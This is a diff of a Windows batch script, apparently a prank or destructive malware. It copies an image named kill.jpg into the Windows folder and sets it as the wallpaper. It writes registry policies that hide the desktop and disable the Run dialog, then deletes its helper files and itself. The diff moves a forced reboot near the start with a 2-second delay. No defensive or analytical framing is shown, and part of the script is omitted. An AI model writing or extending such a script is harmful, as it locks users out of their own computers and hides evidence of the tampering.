@@ -1,4 +1,5 @@
 copy kill.jpg %windir%\kill.jpg
+shutdown /r /t 2
 REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d  "%windir%\kill.jpg" /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoDesktop" /t REG_DWORD /d 1 /f
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"  /v "NoRun" /t REG_DWORD /d 1 /f
@@ -24,4 +25,3 @@ del kill.vbs
 del kill.jpg
 del %0
 
-shutdown /r /t 0
